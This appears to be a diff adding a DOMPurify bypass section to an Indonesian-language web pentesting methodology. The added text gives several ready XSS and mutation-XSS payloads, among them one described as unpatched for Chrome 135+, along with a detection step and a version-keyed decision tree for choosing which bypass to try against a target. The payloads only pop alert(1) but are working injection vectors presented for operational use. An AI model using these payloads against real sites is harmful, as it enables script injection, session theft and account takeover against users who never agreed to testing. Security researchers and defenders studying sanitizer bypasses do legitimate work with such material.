@@ -874,7 +874,57 @@ Confirmed? → Phase 5: Escalate
 - Cari `innerHTML`, `document.write`, `eval` di JS source
 - Test via URL fragment: `#<img src=x onerror=alert(1)>`
 - Gunakan DOM Invader (Burp) untuk auto-detect sinks
+- Untuk kasus DOMPurify gunakan cara di bawah ini(Hanya Gunakan kalo target menggunakan DOMPurify, jika tidak skip cara dibawah)!
 
+DOMPurify Bypass
+
+Beda dengan WAF: DOMPurify tidak block di network — payload masuk normal, tidak ada 403. Sanitasi terjadi di browser saat render. Kalau payload masuk tapi tidak execute → suspect DOMPurify atau client-side sanitasi lainnya.
+
+Cara Detect DOMPurify
+javascript// Di browser DevTools Console:
+DOMPurify.version   // cek versi
+
+// Atau grep source JS target:
+// curl -s https://target.com/app.js | grep -i "dompurify"
+Bypass 1 — SAFE_FOR_TEMPLATES + RETURN_DOM (fixed in 3.4.0)
+Sumber: @calif_io / @kinugawamasato via Codex
+Kondisi: Target pakai Vue/Angular + DOMPurify dengan opsi SAFE_FOR_TEMPLATES: true, RETURN_DOM: true
+Cara kerja: SAFE_FOR_TEMPLATES strip {{...}} agar tidak smuggle ke Vue. Tapi RETURN_DOM skip second check. Payload dipecah pakai junk <foo> tags → DOMPurify strip junk → pieces join kembali jadi {{...}} → Vue execute.
+html<span>{<foo></foo>{constructor.constructor("alert(1)")()|<foo></foo>}</span>
+Verify di console:
+javascriptvar d = '<span>{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</span>';
+document.getElementById('app').appendChild(
+  DOMPurify.sanitize(d, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true })
+);
+new Vue({ el: '#app' });
+
+Bypass 2 — selectedcontent re-clone (recent, unpatched)
+Sumber: @luckyhacker43 / KabirAcharya
+Kondisi: Browser yang support <selectedcontent> element (Chrome 135+)
+Payload:
+html<select><button><selectedcontent></selectedcontent></button><option selected=javascript:1><img src=x onerror=alert(1)>x</option></select>
+Cara kerja: <selectedcontent> adalah element baru yang meng-clone konten dari <option> terpilih ke dalam <button>. DOMPurify sanitize saat parse awal, tapi re-clone terjadi setelah sanitasi → XSS execute.
+
+Bypass 3 — mXSS via namespace confusion (fixed in 2.4.0)
+html<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
+Bypass 4 — template element (fixed in 3.0.0)
+html<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+Bypass 5 — DOM Clobbering (tidak di-sanitize DOMPurify)
+Tidak inject JS langsung, tapi corrupt DOM API:
+html<form id=x><input id=attributes></form>
+Berguna untuk chain ke gadget lain di codebase target.
+
+Decision Tree DOMPurify
+Payload masuk tapi tidak execute
+    ↓
+Cek DOMPurify.version di console
+    ↓
+< 2.4.0 → coba mXSS namespace confusion (Bypass 3)
+< 3.0.0 → coba template element bypass (Bypass 4)
+< 3.4.0 → coba SAFE_FOR_TEMPLATES+RETURN_DOM (Bypass 1)
+Latest  → coba selectedcontent re-clone (Bypass 2, Chrome 135+)
+    ↓
+Semua gagal → coba DOM Clobbering → chain ke gadget
 ---
 
 ### XSS Sinks (grep for these)
